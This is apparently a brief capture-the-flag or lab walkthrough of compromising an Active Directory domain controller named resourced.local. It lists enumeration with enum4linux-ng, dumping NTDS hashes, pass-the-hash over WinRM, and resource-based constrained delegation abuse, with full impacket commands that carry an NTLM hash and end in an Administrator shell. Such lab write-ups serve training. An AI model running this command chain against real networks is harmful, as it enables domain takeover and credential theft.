
![image](https://github.com/user-attachments/assets/fc0f4153-e07b-4061-a969-b07e99667881)
![image](https://github.com/user-attachments/assets/83f0c4e6-0ee9-472e-90b1-7a8fda5f5c4f)
![image](https://github.com/user-attachments/assets/f907684a-69c1-4f7e-b4f8-039369ede0d5)
![image](https://github.com/user-attachments/assets/1b0da170-3e31-4d36-9e4e-7c98ae7d670b)
![image](https://github.com/user-attachments/assets/b31d5884-15bd-49e1-95b7-f9ab03db58fc)
![image](https://github.com/user-attachments/assets/f6bbf820-bc37-4988-b3b6-30d684bf2cbc)
![image](https://github.com/user-attachments/assets/369f21bf-8b1e-40ee-841d-c7aefe183812)
![image](https://github.com/user-attachments/assets/7757337c-fa4b-4f13-a9bd-8d029580a5cf)
![image](https://github.com/user-attachments/assets/e4d3327e-5635-4c79-83a1-989c00484520)
![image](https://github.com/user-attachments/assets/26c42e64-326e-4e88-b05e-bb2c855c0087)
![image](https://github.com/user-attachments/assets/1c93bd31-0222-40be-ab2f-db5f96f566e3)
![image](https://github.com/user-attachments/assets/c5adbfcd-7b81-4338-abbd-fdacb88b3bd3)
![image](https://github.com/user-attachments/assets/d886a818-5176-454e-9466-53f0a54571a9)

![image](https://github.com/user-attachments/assets/c9c99a95-c2a9-402f-935e-e3ddf9dea23e)
![image](https://github.com/user-attachments/assets/1026f7d2-2d21-4faa-87c6-00879e30f4b0)
![image](https://github.com/user-attachments/assets/5877ba44-d307-4947-8deb-ae1bc8bdf957)
![image](https://github.com/user-attachments/assets/83f95c61-f1e4-4c5e-9dbe-39f752759f34)
![image](https://github.com/user-attachments/assets/81a15204-bfc4-4c9b-ab08-9196a9f50843)
![image](https://github.com/user-attachments/assets/ad1a5e48-60f0-4f60-b971-bfb2f2e37c01)
![image](https://github.com/user-attachments/assets/7fb116cb-e733-46a4-8c3a-6f22b47b7b95)
![image](https://github.com/user-attachments/assets/b7fefafc-42fe-482b-a31c-698ee416d19c)

1. enum4linux-ng -A <IP> --> get users, and description for V.Ventz contains info likely password

2. V.Ventz creds to enum SMB --> get ntds.dit & SYSTEM --> impacket-secretsdump, get user names & ntlm hashes

3. crackmapexec winrm --> user L.Livingstone & hash valid (Pwn3rd!)

4. Evil-WinRM as L.Livingstone --> get local flag

5. L.Livingstone is a Domain User and has SeMachineAccountPrivilege Enabled (able to add workstations to domain)

6. add new computer
   ```
   impacket-addcomputer resourced.local/l.livingstone -dc-ip 192.168.210.175 -hashes :19a3a7550ce8c505c2d46b5e39d6f808 -computer-name 'newpc' -computer-pass 'newpc''
   ```

7. assign Resource-Based Constrained Delegation (RBCD)
      ```
      impacket-rbcd -dc-ip 192.168.210.175 -delegate-from newpc$ -delegate-to RESOURCEDC$ -hashes :19a3a7550ce8c505c2d46b5e39d6f808 -action write resourced.local/l.livingstone
   ```

8. set correct FQDN for Kerberos TGS & SPN --> /etc/hosts  192.168.210.175 resourcedc.resourced.local

9. impacket-psexec, via Kerberos ticket（ccache）, get shell as Administrator
   ```
   sudo KRB5CCNAME=Administrator@cifs_resourcedc.resourced.local@RESOURCED.LOCAL.ccache impacket-psexec -k -no-pass resourced.local/Administrator@resourcedc.resourced.local -dc-ip 192.168.210.175
  ```
